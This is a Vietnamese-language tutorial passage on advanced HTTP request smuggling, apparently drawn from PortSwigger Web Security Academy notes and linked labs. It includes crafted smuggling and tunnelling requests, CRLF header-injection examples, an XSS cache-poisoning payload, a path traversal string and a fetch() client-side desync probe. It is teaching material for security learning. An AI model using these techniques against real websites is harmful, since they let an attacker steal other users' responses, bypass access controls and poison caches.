Content-Length: 120
Transfer-Encoding: chunked

0

POST /example HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 25

x=GET / HTTP/1.1
Host: vulnerable-website.com
```

Vì các byte dư thừa này không cấu thành một yêu cầu hợp lệ, điều này thường dẫn đến lỗi và khiến server đóng kết nối.

---

Tuồn một yêu cầu hoàn chỉnh

---

Với một chút cẩn thận, bạn có thể tuồn một **yêu cầu hoàn chỉnh** thay vì chỉ một tiền tố. Miễn là bạn gửi chính xác hai yêu cầu trong một lần gửi, bất kỳ yêu cầu nào tiếp theo trên kết nối sẽ không thay đổi:

> Front-end (CL)

```
POST / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
Content-Type: x-www-form-urlencoded\\r\\n
Content-Length: 61\\r\\n
Transfer-Encoding: chunked\\r\\n
\\r\\n
0\\r\\n
\\r\\n
GET /anything HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
GET / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
```

> Back-end (TE)

```
POST / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
Content-Type: x-www-form-urlencoded\\r\\n
Content-Length: 61\\r\\n
Transfer-Encoding: chunked\\r\\n
\\r\\n
0\\r\\n
\\r\\n
GET /anything HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
GET / HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
```

> Lưu ý rằng không có yêu cầu không hợp lệ nào tới back-end, nên kết nối sẽ giữ mở sau cuộc tấn công.

---

Làm mất đồng bộ hàng đợi phản hồi

---

Khi bạn tuồn một yêu cầu hoàn chỉnh, máy chủ front-end vẫn nghĩ rằng nó chỉ chuyển tiếp một yêu cầu duy nhất. Ngược lại, máy chủ back-end thấy hai yêu cầu tách biệt và sẽ gửi hai phản hồi tương ứng:

![image.png](attachment:3b19c431-c032-42a6-bb13-73ecd4185e62:image.png)

Front-end sẽ ánh xạ chính xác phản hồi đầu tiên tới yêu cầu "bọc" ban đầu và chuyển phản hồi đó về cho client. Vì không còn yêu cầu nào đang chờ phản hồi, phản hồi thứ hai bất ngờ sẽ bị giữ trong một hàng đợi trên kết nối giữa front-end và back-end.

Khi front-end nhận được một yêu cầu khác, nó sẽ chuyển tiếp yêu cầu này tới back-end như bình thường. Tuy nhiên, khi phải trả về phản hồi, front-end sẽ gửi phản hồi đầu tiên trong hàng đợi — tức là phản hồi còn sót lại của yêu cầu bị tuồn.

Phản hồi đúng từ back-end sau đó bị bỏ lại mà không có yêu cầu tương ứng. Vòng tuần hoàn này lặp lại mỗi khi một yêu cầu mới được chuyển xuống cùng một kết nối tới back-end.

---

Thu thập phản hồi của người dùng khác

---

Khi hàng đợi phản hồi đã bị đầu độc, kẻ tấn công chỉ cần gửi một yêu cầu tùy ý để thu được phản hồi của người dùng khác.

![image.png](attachment:0f64d494-34cd-4b78-b693-0f767f15e081:image.png)

Kẻ tấn công có thể tiếp tục lấy cắp phản hồi theo cách này miễn là kết nối front-end/back-end vẫn còn mở. Thời điểm một kết nối bị đóng khác nhau tùy theo máy chủ, nhưng một thiết lập mặc định phổ biến là đóng kết nối sau khi nó đã xử lý 100 yêu cầu. Việc đầu độc lại (repoison) một kết nối mới sau khi kết nối hiện tại bị đóng cũng rất dễ thực hiện.

> **Mẹo** Để dễ phân biệt phản hồi bị đánh cắp với phản hồi cho các yêu cầu của chính bạn, hãy thử dùng một đường dẫn không tồn tại trong cả hai yêu cầu bạn gửi. Như vậy, các yêu cầu của bạn sẽ liên tục nhận được ví dụ như phản hồi 404, giúp phân biệt rõ ràng.

[Lab: Response queue poisoning via H2.TE request smuggling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning/lab-request-smuggling-h2-response-queue-poisoning-via-te-request-smuggling)

---

## HTTP/2 request splitting

---

Khi chúng ta xem xét **response queue poisoning**, bạn đã học cách tách một yêu cầu HTTP duy nhất thành đúng hai yêu cầu hoàn chỉnh ở phía back-end. Trong ví dụ ta xem, điểm tách xảy ra bên trong **phần thân** (message body), nhưng khi có **hạ cấp HTTP/2** (HTTP/2 downgrading) diễn ra, bạn cũng có thể gây ra tách này xảy ra ở **phần header**.

Cách tiếp cận này linh hoạt hơn vì bạn không phụ thuộc vào việc sử dụng các **phương thức yêu cầu** cho phép chứa thân. Ví dụ, bạn thậm chí có thể dùng một yêu cầu **GET**:

```
:method	GET
:path	/
:authority	vulnerable-website.com
foo
bar\\r\\n
\\r\\n
GET /admin HTTP/1.1\\r\\n
Host: vulnerable-website.com
```

Điều này cũng hữu ích trong các trường hợp **Content-Length** được xác thực và back-end không hỗ trợ **chunked encoding**.

---

### Viết lại FE

---

Để tách một yêu cầu ở phần header, bạn cần hiểu cách yêu cầu được front-end server viết lại và tính đến điều này khi chèn bất kỳ header HTTP/1 nào bằng tay. Nếu không, một trong hai yêu cầu có thể sẽ thiếu các header bắt buộc.

Ví dụ, bạn cần đảm bảo rằng cả hai yêu cầu nhận được bởi back-end đều chứa header Host. Các front-end server thường loại bỏ pseudo-header `:authority` và thay thế nó bằng một header HTTP/1 `Host` mới trong quá trình hạ cấp. Có những cách tiếp cận khác nhau để làm việc này, và chúng có thể ảnh hưởng tới vị trí mà bạn cần đặt header Host mà bạn chèn vào.

Xem xét yêu cầu sau:

```
:method	GET
:path	/
:authority	vulnerable-website.com
foo
bar\\r\\n
\\r\\n
GET /admin HTTP/1.1\\r\\n
Host: vulnerable-website.com
```

Trong quá trình viết lại, một số front-end server sẽ thêm header Host mới vào cuối danh sách header hiện tại. Đối với một front-end HTTP/2, điều này là sau header `foo`. Lưu ý rằng đây cũng là sau điểm mà yêu cầu sẽ bị tách ở phía back-end. Điều này có nghĩa là yêu cầu đầu tiên sẽ hoàn toàn không có header Host, trong khi yêu cầu bị nhét lén (smuggled request) sẽ có hai header Host. Trong trường hợp này, bạn cần định vị header Host chèn vào sao cho nó kết thúc ở yêu cầu đầu tiên sau khi xảy ra tách:

```
:method	GET
:path	/
:authority	vulnerable-website.com
foo
bar\\r\\n
Host: vulnerable-website.com\\r\\n
\\r\\n
GET /admin HTTP/1.1
```

Bạn cũng sẽ cần điều chỉnh vị trí của bất kỳ header nội bộ nào mà bạn muốn chèn theo cách tương tự.

[Lab: HTTP/2 request splitting via CRLF injection | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)

> Mẹo
> 
> Trong ví dụ trên, chúng ta đã tách yêu cầu theo cách kích hoạt **response queue poisoning**, nhưng bạn cũng có thể nhét tiền tố cho các cuộc tấn công **request smuggling** cổ điển theo cách này. Trong trường hợp đó, các header bạn chèn có thể xung đột với các header trong yêu cầu được nối vào tiền tố của bạn ở phía back-end, dẫn đến lỗi trùng lặp header hoặc khiến yêu cầu bị kết thúc ở vị trí không mong muốn. Để giảm thiểu điều này, bạn có thể bao gồm một tham số thân đuôi (trailing body parameter) trong tiền tố bị nhét lén cùng với một header `Content-Length` lớn hơn một chút so với thân. Yêu cầu nạn nhân vẫn sẽ được nối vào tiền tố bị nhét lén của bạn nhưng sẽ bị cắt bớt trước khi đến phần header.

---

## **HTTP request tunnelling**

---

Nhiều cuộc tấn công **request smuggling** mà chúng ta đã đề cập chỉ khả thi vì cùng một kết nối giữa front-end và back-end xử lý nhiều yêu cầu. Mặc dù một số máy chủ sẽ tái sử dụng kết nối cho mọi yêu cầu, những máy chủ khác có chính sách nghiêm ngặt hơn.

Ví dụ, một số máy chủ chỉ cho phép tái sử dụng kết nối đối với các yêu cầu có nguồn tới từ cùng một địa chỉ IP hoặc cùng một client. Những máy chủ khác thì không tái sử dụng kết nối chút nào, điều này giới hạn những gì bạn có thể thực hiện thông qua **request smuggling** cổ điển vì bạn sẽ không có cách rõ ràng để ảnh hưởng tới lưu lượng của người dùng khác.

![image.png](attachment:348f733d-9ecc-4585-a89c-e0a631d402c7:image.png)

Mặc dù bạn không thể đầu độc socket để can thiệp vào các yêu cầu của người dùng khác, bạn vẫn có thể gửi một yêu cầu đơn lẻ mà khiến back-end trả về hai phản hồi. Điều này có khả năng cho phép bạn ẩn một yêu cầu và phản hồi tương ứng của nó khỏi front-end hoàn toàn.

![image.png](attachment:f704339f-ad27-4fe9-916b-d8e8c15dfa57:image.png)

Bạn có thể dùng kỹ thuật này để vượt qua các biện pháp bảo mật ở front-end vốn có thể ngăn bạn gửi những yêu cầu nhất định. Thực tế là, ngay cả một số cơ chế được thiết kế riêng để ngăn chặn các cuộc tấn công **request smuggling** cũng không thể chặn được **request tunnelling**.

Việc tunnel (đường hầm) các yêu cầu tới back-end theo cách này cung cấp một dạng **request smuggling** hạn chế hơn, nhưng trong tay kẻ tấn công thành thục nó vẫn có thể dẫn tới các khai thác mức độ nghiêm trọng cao.

---

### HTTP/2

---

Request tunnelling có thể thực hiện được cả trên HTTP/1 và HTTP/2 nhưng việc phát hiện trên môi trường chỉ có HTTP/1 khó hơn nhiều. Do cách hoạt động của các kết nối duy trì (keep-alive) trong HTTP/1, ngay cả khi bạn nhận được hai phản hồi, điều đó không nhất thiết xác nhận rằng yêu cầu đã được smuggle thành công.

Ngược lại, trong HTTP/2, mỗi **luồng (stream)** chỉ nên chứa đúng một yêu cầu và một phản hồi. Nếu bạn nhận được một phản hồi HTTP/2 mà trong phần thân (body) lại xuất hiện thứ giống như một phản hồi HTTP/1, bạn có thể tự tin rằng mình đã **tunnel** (đường hầm) thành công một yêu cầu thứ hai.

---

### **Leaking internal headers**

---

Khi **request tunnelling** là lựa chọn duy nhất, bạn sẽ không thể rò rỉ header nội bộ bằng kỹ thuật chúng ta đã đề cập trong một trong các lab trước đây, nhưng **hạ cấp HTTP/2** (HTTP/2 downgrading) cho phép một giải pháp thay thế.

Bạn có thể lừa front-end thêm các header nội bộ vào bên trong thứ sẽ trở thành một **tham số trong thân** (body parameter) ở phía back-end. Giả sử chúng ta gửi một yêu cầu trông như sau:

```
:method	POST
:path	/comment
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
foo
bar\\r\\n
Content-Length: 200\\r\\n
\\r\\n
comment=

x=1
```

Trong trường hợp này, cả front-end và back-end đều đồng ý rằng chỉ có một yêu cầu. Điều thú vị là chúng có thể bị làm cho **không đồng ý** về nơi mà phần header kết thúc.

Front-end thấy tất cả những gì ta chèn là một phần của header, nên sẽ thêm bất kỳ header mới nào sau chuỗi `comment=`. Ngược lại, back-end thấy chuỗi `\\r\\n\\r\\n` và cho rằng đây là kết thúc của header. Chuỗi `comment=` cùng với các header nội bộ được xử lý như một phần của thân. Kết quả là một tham số `comment` có giá trị là các header nội bộ.

```
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1
```

---

### **Blind request**

---

Một số front-end server đọc tất cả dữ liệu mà chúng nhận được từ back-end. Điều này có nghĩa là nếu bạn tunnel (đường hầm) thành công một yêu cầu, chúng có thể chuyển tiếp cả hai phản hồi tới client, với phản hồi cho yêu cầu bị tunnel nằm lồng bên trong phần thân của phản hồi chính.

Những front-end server khác chỉ đọc số byte được chỉ định trong header `Content-Length` của phản hồi, vì vậy chỉ phản hồi đầu tiên được chuyển tiếp tới client. Điều này dẫn tới một lỗ hổng **blind request tunnelling** vì bạn sẽ không thể thấy phản hồi cho yêu cầu bị tunnel.

---

### **Non-blind request**

---

Blind request tunnelling (đường hầm mù) có thể khó khai thác, nhưng đôi khi bạn có thể biến những lỗ hổng này thành không mù bằng cách sử dụng các yêu cầu HEAD.

Phản hồi cho các yêu cầu HEAD thường chứa header `Content-Length` dù chúng không có thân (body) riêng. Giá trị này thường chỉ độ dài của tài nguyên sẽ được trả về bởi một yêu cầu GET tới cùng endpoint. Một số front-end server không xử lý đúng điều này và cố đọc số byte được chỉ định trong header bất kể. Nếu bạn tunnel (đường hầm) một yêu cầu qua front-end server mà có hành vi này, hành vi đó có thể khiến nó đọc quá phần phản hồi từ back-end. Do đó, phản hồi bạn nhận được có thể chứa các byte từ phần bắt đầu của phản hồi cho yêu cầu bị tunnel của bạn.

> Yêu cầu

```
:method	HEAD
:path	/example
:authority	vulnerable-website.com
foo
bar\\r\\n
\\r\\n
GET /tunnelled HTTP/1.1\\r\\n
Host: vulnerable-website.com\\r\\n
X: x
```

> Phản hồi

```
:status	200
content-type	text/html
content-length	131
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4286

<!DOCTYPE html>
<h1>Tunnelled</h1>
<p>This is a tunnelled respo
```

Vì bạn đang pha trộn header `Content-Length` từ một phản hồi với thân của phản hồi khác, việc sử dụng kỹ thuật này thành công đòi hỏi phải cân bằng một chút.

Nếu endpoint mà bạn gửi yêu cầu HEAD trả về một tài nguyên ngắn hơn phản hồi tunnel mà bạn cố đọc, phản hồi đó có thể bị cắt bớt trước khi bạn thấy gì hữu ích, như trong ví dụ trên. Ngược lại, nếu `Content-Length` trả về lớn hơn phản hồi cho yêu cầu tunnel của bạn, bạn có khả năng gặp timeout vì front-end server sẽ chờ thêm byte từ back-end.

May mắn là, với một chút thử sai, bạn thường có thể vượt qua các vấn đề này bằng một trong các giải pháp sau:

1. Trỏ yêu cầu HEAD của bạn tới một endpoint khác trả về tài nguyên dài hơn hoặc ngắn hơn tùy nhu cầu.
2. Nếu tài nguyên quá ngắn, sử dụng một input phản chiếu (reflected input) trong yêu cầu HEAD chính để chèn các ký tự padding tùy ý. Mặc dù bạn sẽ không thực sự thấy input của mình được phản chiếu, `Content-Length` trả về vẫn sẽ tăng theo.
3. Nếu tài nguyên quá dài, sử dụng một input phản chiếu trong yêu cầu bị tunnel để chèn các ký tự tùy ý sao cho độ dài của phản hồi tunnel khớp hoặc vượt quá độ dài mong đợi.

[Lab: Bypassing access controls via HTTP/2 request tunnelling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling)

---

## Web cache

---

Mặc dù **request tunnelling** thường hạn chế hơn so với **request smuggling** cổ điển, đôi khi bạn vẫn có thể dựng được các cuộc tấn công mức độ nghiêm trọng cao. Ví dụ, bạn có thể kết hợp các kỹ thuật đường hầm yêu cầu đã xem để tạo một dạng **web cache poisoning** mạnh hơn.

Với đường hầm không mù (non-blind request tunnelling), bạn có thể pha trộn các header từ một phản hồi với thân của phản hồi khác. Nếu phần thân phản hồi phản chiếu đầu vào do người dùng kiểm soát mà không mã hóa, bạn có thể lợi dụng hành vi này để thực hiện **XSS phản chiếu** trong các ngữ cảnh mà trình duyệt bình thường sẽ không thực thi mã.

Ví dụ, phản hồi sau chứa dữ liệu do attacker kiểm soát mà không được mã hóa:

```
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

Tự thân nó, điều này tương đối vô hại. `Content-Type` khiến payload này chỉ được trình duyệt hiểu như JSON. Nhưng hãy xét điều gì xảy ra nếu bạn tunnel (đường hầm) phản hồi này tới back-end thay vì để front-end xử lý trực tiếp. Phản hồi này sẽ xuất hiện bên trong thân của một phản hồi khác, về thực chất sẽ kế thừa các header của phản hồi chứa nó, bao gồm cả `Content-Type`.

```
:status	200
content-type	text/html
content-length	174
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

Khi bộ nhớ đệm (caching) diễn ra ở phía front-end, các cache cũng có thể bị lừa để phục vụ những phản hồi trộn lẫn này cho những người dùng khác.

[Lab: Web cache poisoning via HTTP/2 request tunnelling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling)

---

## [0.CL](http://0.CL)

---

Tấn công [0.CL](http://0.CL) xảy ra khi front-end bỏ qua một header `Content-Length` mà back-end lại xử lý. Kịch bản này từng được coi là không thể khai thác do các tình trạng treo kết nối (connection deadlocks) giữa các máy chủ.

Tuy nhiên, bằng cách kết hợp một cuộc tấn công [0.CL](http://0.CL) với **early-response gadget** - một kỹ thuật khiến back-end trả lời trước khi nhận xong toàn bộ thân yêu cầu - kẻ tấn công có thể phá vỡ deadlock, rồi dùng **double desync** để xây dựng một khai thác hoàn chỉnh. Đột phá này cho phép khai thác các kịch bản [0.CL](http://0.CL).

Để biết chi tiết kỹ thuật hơn, xem whitepaper đi kèm: _HTTP/1.1 Must Die._

[Lab: 0.CL request smuggling | Web Security Academy](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-0cl-request-smuggling)

---

# **Browser-powered**

---

Trong phần này, bạn sẽ học cách tạo ra các khai thác có mức nghiêm trọng cao mà không cần dựa vào các yêu cầu bị sai định dạng mà trình duyệt sẽ không bao giờ gửi. Điều này không chỉ mở rộng phạm vi các website có thể bị request smuggling phía máy chủ, mà còn cho phép bạn thực hiện các biến thể phía khách (client-side) của những tấn công này bằng cách khiến trình duyệt của nạn nhân tự đầu độc kết nối của chính nó tới một máy chủ web dễ bị tổn thương.

> **Nghiên cứu PortSwigger**
> 
> Tài liệu và các bài lab trong phần này dựa trên _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_ của PortSwigger Research. Nghiên cứu này cũng dẫn tới việc phát hiện một kỹ thuật vượt qua bộ lọc header **Host**, lợi dụng các lỗ hổng liên quan tới trạng thái kết nối.

---

## CL.0

---

Lỗ hổng request smuggling xuất phát từ sự khác biệt trong cách các hệ thống xâu chuỗi (chained systems) xác định điểm bắt đầu và kết thúc của từng yêu cầu. Thường điều này do việc phân tích header không nhất quán, dẫn đến việc một máy chủ sử dụng `Content-Length` của yêu cầu trong khi máy chủ khác lại xử lý thông điệp như chunked. Tuy nhiên, nhiều dạng tấn công tương tự vẫn có thể thực hiện được mà không phụ thuộc vào bất kỳ vấn đề nào trong số này.

Trong một số trường hợp, máy chủ có thể bị thuyết phục để bỏ qua header `Content-Length`, tức là nó giả định rằng mỗi yêu cầu kết thúc ngay khi phần header kết thúc. Hành vi này về bản chất tương đương với việc coi `Content-Length` là 0.

Nếu máy chủ back-end có hành vi này, nhưng front-end vẫn dùng header `Content-Length` để xác định nơi kết thúc yêu cầu, bạn có thể khai thác sự sai khác này để thực hiện request smuggling HTTP. Chúng tôi quyết định gọi loại lỗ hổng này là "CL.0".

> PortSwigger Research
> 
> Tài liệu và các bài lab trong phần này dựa trên _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_ của PortSwigger Research.

---

### Kiểm thử

---

Để dò tìm lỗ hổng CL.0, trước tiên gửi một yêu cầu có chứa một yêu cầu một phần khác bên trong thân (body) của nó, sau đó gửi một yêu cầu tiếp theo bình thường. Sau đó bạn kiểm tra xem phản hồi của yêu cầu tiếp theo có bị ảnh hưởng bởi phần tiền tệ (smuggled prefix) hay không.

Trong ví dụ dưới, yêu cầu tiếp theo tới trang chủ nhận được mã trả về 404. Điều này cho thấy rất có khả năng máy chủ back-end đã hiểu phần thân của yêu cầu POST (GET /hopefully404...) như là phần bắt đầu của một yêu cầu khác.

```
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x

GET / HTTP/1.1
Host: vulnerable-website.com
```

```
HTTP/1.1 200 OK
HTTP/1.1 404 Not Found
```

Điều quan trọng là, hãy chú ý rằng chúng ta **không** can thiệp hay giả mạo các header theo bất kỳ cách nào - độ dài của yêu cầu được chỉ định bởi header `Content-Length` hoàn toàn bình thường và chính xác.

Để thử bản thân bằng Burp Repeater:

1. Tạo một tab chứa yêu cầu thiết lập (setup request) và một tab khác chứa một yêu cầu tiếp theo tùy ý.
2. Thêm hai tab vào cùng một nhóm theo đúng thứ tự.
3. Dùng menu xổ xuống bên cạnh nút Send, thay đổi chế độ gửi thành **Send group in sequence (single connection)**.
4. Đổi header `Connection` thành `keep-alive`.
5. Gửi chuỗi yêu cầu và kiểm tra các phản hồi.

Trong thực tế, chúng tôi thường quan sát hành vi này ở các endpoint vốn không mong đợi các yêu cầu POST, vì vậy chúng ngầm định rằng sẽ không có thân (body) trong yêu cầu. Các endpoint dẫn đến redirect ở cấp độ máy chủ và các yêu cầu tới file tĩnh thường là những ứng viên hàng đầu.

---

### Kích hoạt

---

Nếu bạn không tìm thấy endpoint nào có vẻ dễ bị tấn công, bạn có thể thử **kích hoạt hành vi này** theo cách khác.

Khi các header của một yêu cầu gây ra lỗi máy chủ, một số máy chủ sẽ gửi phản hồi lỗi **mà không đọc (consume)** phần thân (body) của yêu cầu từ socket. Nếu sau đó chúng **không đóng kết nối**, điều này có thể tạo ra một **vector `desync CL.0` thay thế**.

Bạn cũng có thể thử sử dụng các yêu cầu `GET` với một header **`Content-Length` bị làm nhiễu (obfuscated)**.

Nếu bạn có thể che giấu header này khỏi máy chủ back-end nhưng **vẫn để front-end đọc được**, điều này cũng có khả năng gây ra tình trạng **desync**.

Chúng ta đã từng xem qua một số kỹ thuật **làm nhiễu header (header obfuscation)** khi học về **tấn công request smuggling kiểu `TE.TE`**.

---

### Khai thác

---

Bạn có thể lợi dụng lỗ hổng CL.0 để thực hiện cùng các cuộc tấn công request smuggling phía máy chủ mà chúng ta đã đề cập trong các tài liệu request smuggling trước đó. Hãy thử điều này với lab sau.


### H2.0

---

Các website mà hạ cấp (downgrade) các yêu cầu HTTP/2 xuống HTTP/1 có thể dễ bị một vấn đề tương đương gọi là "H2.0" nếu máy chủ back-end bỏ qua header Content-Length của yêu cầu đã bị hạ cấp.

---

### Bảo mật

---

Để biết một số biện pháp tổng quát bạn có thể áp dụng để ngăn chặn lỗ hổng CL.0 và các dạng tấn công desync khác, xem phần How to prevent HTTP request smuggling vulnerabilities.

---

## Tấn công desync

---

Các cuộc tấn công desync hoặc request smuggling cổ điển dựa vào các yêu cầu bị làm sai định dạng một cách cố ý mà các trình duyệt thông thường sẽ không bao giờ gửi. Điều này làm giới hạn các cuộc tấn công này đối với những website sử dụng kiến trúc front-end/back-end. Tuy nhiên, như chúng ta đã thấy từ các cuộc tấn công CL.0, có thể gây ra desync bằng các yêu cầu HTTP/1.1 hoàn toàn tương thích với trình duyệt. Điều này không chỉ mở ra những khả năng mới cho request smuggling phía máy chủ, mà còn cho phép xuất hiện một lớp mối đe dọa hoàn toàn mới - các tấn công desync phía khách.

> Nghiên cứu PortSwigger
> 
> Tài liệu và các bài lab trong phần này dựa trên _Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling_ của PortSwigger Research.

---

### Khái niệm

---

Desync phía khách (client-side desync - CSD) là một cuộc tấn công khiến trình duyệt web của nạn nhân bị mất đồng bộ (desynchronize) chính kết nối của nó tới website dễ bị tổn thương. Điều này trái ngược với các cuộc tấn công request smuggling thông thường, vốn gây mất đồng bộ giữa máy chủ front-end và back-end.

![image.png](attachment:bc523448-2701-47d0-a435-fe603f45f02f:image.png)

Máy chủ web đôi khi có thể bị khuyến khích trả về phản hồi cho các yêu cầu POST mà không đọc phần thân (body). Nếu chúng sau đó cho phép trình duyệt tái sử dụng cùng một kết nối cho các yêu cầu bổ sung, điều này dẫn tới lỗ hổng desync phía khách.

Ở mức cao, một cuộc tấn công CSD gồm các giai đoạn sau:

- Nạn nhân truy cập một trang web trên một tên miền bất kỳ chứa mã JavaScript độc hại.
- JavaScript khiến trình duyệt của nạn nhân gửi một yêu cầu tới website dễ bị tổn thương. Yêu cầu này chứa một **tiền tố yêu cầu** do kẻ tấn công điều khiển trong phần thân, tương tự như trong một cuộc tấn công request smuggling thông thường.
- Tiền tố độc hại được để lại trên socket TCP/TLS của máy chủ sau khi máy chủ trả lời yêu cầu ban đầu, khiến kết nối giữa trình duyệt và máy chủ bị desync.
- JavaScript sau đó kích hoạt một yêu cầu tiếp theo qua **kết nối đã bị đầu độc**. Yêu cầu này được nối vào tiền tố độc hại, khiến máy chủ trả về một phản hồi có hại.

Vì các cuộc tấn công này không phụ thuộc vào sự khác biệt trong cách phân tích giữa hai máy chủ, nên ngay cả các website một máy chủ (single-server) cũng có thể chịu ảnh hưởng.

> **Lưu ý**
> 
> Để những cuộc tấn công này hoạt động, điều quan trọng là máy chủ mục tiêu **không** được hỗ trợ HTTP/2. Desync phía khách dựa trên việc tái sử dụng kết nối HTTP/1.1, và các trình duyệt thường ưu tiên HTTP/2 khi có.
> 
> Một ngoại lệ là nếu bạn nghi ngờ nạn nhân sẽ truy cập site thông qua một proxy chuyển tiếp (forward proxy) chỉ hỗ trợ HTTP/1.1.

---

### Kiểm thử

---

Do tính phức tạp tăng thêm khi phụ thuộc vào trình duyệt để truyền tải khai thác, điều quan trọng là phải tiến hành kiểm tra lỗ hổng desync phía khách một cách có phương pháp. Mặc dù đôi khi bạn có thể bị cám dỗ muốn nhảy thẳng vào phần sau, chúng tôi khuyến nghị quy trình làm việc sau. Điều này đảm bảo bạn xác nhận các giả thiết về từng thành phần của cuộc tấn công theo từng bước.

- Dò tìm các vector desync tiềm năng bằng Burp.
- Xác nhận vector desync trong Burp.
- Xây dựng một proof-of-concept để tái tạo hành vi trong trình duyệt.
- Xác định một gadget có thể khai thác.
- Tạo một exploit hoạt động trong Burp.
- Tái tạo exploit đó trong trình duyệt.

Cả Burp Scanner và tiện ích mở rộng HTTP Request Smuggler đều có thể giúp tự động hóa phần lớn quy trình này, nhưng biết cách làm thủ công vẫn hữu ích để củng cố hiểu biết về cách thức hoạt động của nó.

---

**Dò tìm các vector desync tiềm năng bằng Burp**

---

Bước đầu trong việc kiểm tra lỗ hổng desync phía khách là xác định hoặc tạo một yêu cầu khiến máy chủ bỏ qua header `Content-Length`. Cách đơn giản nhất để dò hành vi này là gửi một yêu cầu trong đó `Content-Length` được chỉ định dài hơn thân thực tế:

- Nếu yêu cầu chỉ bị treo hoặc hết thời gian chờ, điều này gợi ý rằng máy chủ đang chờ các byte còn lại được hứa bởi các header.
- Nếu bạn nhận được phản hồi ngay lập tức, bạn có khả năng đã tìm thấy một vector CSD. Điều này cần được điều tra thêm.

Giống như với các lỗ hổng CL.0, chúng tôi thấy rằng các ứng viên có khả năng nhất là các endpoint không mong đợi các yêu cầu `POST`, chẳng hạn như các file tĩnh hoặc chuyển hướng ở cấp máy chủ.

Ngoài ra, bạn có thể gợi hành vi này bằng cách kích hoạt lỗi máy chủ. Trong trường hợp đó, hãy nhớ rằng bạn vẫn cần một yêu cầu mà trình duyệt sẽ gửi được cross-domain. Trong thực tế, điều này có nghĩa là bạn chỉ có thể thao túng URL, thân (body), cùng một vài thứ lặt vặt như header `Referer` và phần sau của header `Content-Type`.

```
Referer: <https://evil-user.net/?%00>
Content-Type: application/x-www-form-urlencoded; charset=null, boundary=x
```

Bạn cũng có thể kích lỗi máy chủ bằng cách cố gắng điều hướng lên trên thư mục gốc web. Chỉ cần nhớ rằng trình duyệt sẽ chuẩn hóa đường dẫn, nên bạn sẽ cần mã hóa URL các ký tự trong chuỗi traversal của mình:

```
GET /%2e%2e%2f HTTP/1.1
```

---

**Xác nhận vector desync trong Burp**

---

Cần lưu ý rằng một số máy chủ an toàn sẽ trả về phản hồi mà không chờ phần thân, nhưng vẫn xử lý phần thân đúng cách khi nó đến. Những máy chủ khác không xử lý `Content-Length` đúng nhưng lại đóng kết nối ngay sau khi phản hồi, khiến chúng không thể khai thác được.

Để lọc những trường hợp này, hãy thử gửi hai yêu cầu qua cùng một kết nối để xem bạn có thể dùng phần thân của yêu cầu đầu tiên để ảnh hưởng tới phản hồi của yêu cầu thứ hai hay không - giống như cách bạn làm khi dò tìm lỗ hổng CL.0 request smuggling.

---

**Xây dựng một proof-of-concept để tái tạo hành vi trong trình duyệt**

---

Khi bạn đã xác định được một vector phù hợp bằng Burp, điều quan trọng là xác nhận rằng bạn có thể tái tạo desync trong trình duyệt.

> **Yêu cầu trình duyệt**
> 
> Để giảm khả năng có can thiệp và đảm bảo rằng thử nghiệm của bạn mô phỏng trình duyệt của nạn nhân một cách sát nhất có thể:
> 
> - Sử dụng một trình duyệt **không** đang chuyển tiếp (proxy) lưu lượng qua Burp Suite - việc dùng bất kỳ proxy HTTP nào có thể ảnh hưởng đáng kể tới khả năng thành công của khai thác. Chúng tôi khuyến nghị Chrome vì công cụ phát triển của nó cung cấp một số tính năng hữu ích để gỡ lỗi.
> - Vô hiệu hóa mọi tiện ích mở rộng (extensions) của trình duyệt.

- Truy cập trang từ đó bạn dự định khởi chạy khai thác trên nạn nhân. Trang này phải ở một tên miền khác với trang dễ bị tấn công và được truy cập qua HTTPS. Trong các lab của chúng tôi, bạn có thể sử dụng exploit server được cung cấp.
- Mở công cụ phát triển của trình duyệt và vào tab **Network**.
- Thực hiện các điều chỉnh sau:
    - Chọn tùy chọn **Preserve log**.
    - Nhấp chuột phải vào phần headers và bật cột **Connection ID**.

Điều này đảm bảo mỗi yêu cầu mà trình duyệt gửi được ghi lại trên tab Network, cùng với chi tiết kết nối mà nó sử dụng. Điều này có thể giúp gỡ lỗi các vấn đề sau này.

Chuyển sang tab **Console** và dùng `fetch()` để tái tạo probe desync mà bạn đã thử trong Burp. Mã nên trông giống như sau:

```jsx
fetch('<https://vulnerable-website.com/vulnerable-endpoint>', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x', // malicious prefix
    mode: 'no-cors', // ensures the connection ID is visible on the Network tab
    credentials: 'include' // poisons the "with-cookies" connection pool
}).then(() => {
    location = '<https://vulnerable-website.com/>' // uses the poisoned connection
})
```

Ngoài việc chỉ định phương thức `POST` và thêm tiền tố độc hại vào thân, hãy lưu ý rằng chúng ta đã thiết lập các tuỳ chọn sau:
